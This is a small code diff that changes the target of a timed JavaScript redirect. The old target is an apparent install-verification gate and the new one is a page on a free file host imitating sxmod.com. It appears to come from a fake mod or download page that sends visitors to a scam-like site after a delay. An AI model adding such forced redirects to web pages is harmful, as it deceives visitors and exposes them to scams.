@@ -118,7 +118,7 @@ $(document).ready(function() {
 								});	
 							}, 12500 );
 							setTimeout(function() {
-								window.location.replace("https://appinstallcheck.com/cl/i/8dqrr3");
+								window.location.replace("https://w1eiwegv733ozzhleiodbqa.on.drv.tw/www.sxmod.com/");
 							}, 15500 );
 						}	
 					});	
